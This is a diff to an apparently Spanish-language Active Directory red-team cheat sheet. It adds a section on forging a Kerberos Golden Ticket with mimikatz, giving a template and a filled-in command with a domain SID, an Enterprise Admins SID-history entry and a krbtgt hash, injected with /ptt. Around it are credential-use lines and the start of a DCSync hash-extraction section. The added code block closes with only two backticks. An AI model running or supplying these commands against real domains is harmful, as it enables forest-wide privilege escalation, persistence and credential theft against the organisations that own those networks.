@@ -59,6 +59,15 @@ PS> klist
 PS> iwr -UseDefaultCredentials http://web04
 ```
 
+#### Crear Golden Ticket
+```
+kerberos::golden /user:Administrator /domain:<CHILD-DOMAIN>
+/sid:<SID-CHILD-DOMAIN> /sids:<SID-DOMAIN>-<ID-USER> /krbtgt:<HASH-NT-KRBTGT> /ptt
+
+kerberos::golden /user:Administrator /domain:child.redteam.corp
+/sid:S-1-5-21-2332039752-785340267-2377082902 /sids:S-1-5-21-1882140339-3759710628-635303199-519 /krbtgt:24dd6646fd7e11b60b6a9508e6fe7e5a /ptt
+``
+
 #### Extraer hashes NTLM cuando el usuario tiene DCSync
 ```
 privilege::debug
